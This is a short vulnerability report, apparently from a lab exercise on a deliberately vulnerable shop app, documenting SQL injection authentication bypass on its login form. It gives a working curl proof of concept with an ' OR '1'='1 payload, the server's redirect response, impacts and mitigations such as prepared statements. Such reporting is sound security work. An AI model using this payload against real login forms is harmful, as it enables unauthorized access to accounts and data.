# Vulnerability Report: SQL Injection (Authentication Bypass) on Login Form

## 1. Vulnerability Type
SQL Injection (Authentication Bypass)

## 2. Location
Login Form (`/login`)

## 3. Description
The VULN SHOP application's login form is vulnerable to SQL Injection. The input provided by users in the `username` and `password` fields is not properly sanitized, validated, or parameterized before being incorporated into a SQL query. This allows an attacker to inject malicious SQL code, effectively bypassing the authentication mechanism and gaining unauthorized access to the application.

## 4. Proof of Concept (PoC)

### Step 1: Craft and Submit Malicious Credentials
An attacker can submit a login request with specially crafted `username` and `password` values designed to manipulate the underlying SQL query.

**Request (example using curl):**
```bash
export TARGET="http://192.168.0.28:3000"
export MY_IP="10.0.0.103"
curl -X POST -H "X-Forwarded-For: $MY_IP" \
-d "username=admin' OR '1'='1&password=admin' OR '1'='1" \
$TARGET/login
```
In this payload, `admin' OR '1'='1` makes the SQL query's WHERE clause evaluate to true, regardless of the actual stored credentials, thereby authenticating the user.

### Step 2: Observe Authentication Bypass
Upon submitting the malicious credentials, the server responds with a redirection to the application's root (`/`).

**Observed Server Response:**
```
Found. Redirecting to /
```
This redirection indicates that the application considered the login successful, granting unauthorized access.

## 5. Impact
A successful SQL Injection leading to authentication bypass can result in:
-   **Unauthorized Access:** Gaining access to the application as a legitimate user, potentially an administrator, without knowing their credentials.
-   **Data Compromise:** Access to sensitive user data, application configurations, or database contents.
-   **Privilege Escalation:** If logged in as a privileged user, the attacker can perform actions reserved for that role.
-   **Complete System Compromise:** In some cases, advanced SQL Injection techniques can lead to remote code execution on the server.

## 6. Suggested Mitigation
To prevent SQL Injection vulnerabilities, robust security measures must be implemented:
-   **Parameterized Queries (Prepared Statements):** Always use parameterized queries (also known as prepared statements) for all database interactions. This separates SQL code from user-supplied data, ensuring that input is treated as literal values rather than executable SQL.
-   **Input Validation:** Implement strict server-side input validation to reject or sanitize any input that does not conform to expected formats or contains potentially malicious characters.
-   **Least Privilege:** Ensure that database users have only the minimum necessary privileges to perform their functions.
-   **Error Handling:** Avoid verbose error messages that might reveal database structure or internal application logic. Implement generic error messages.
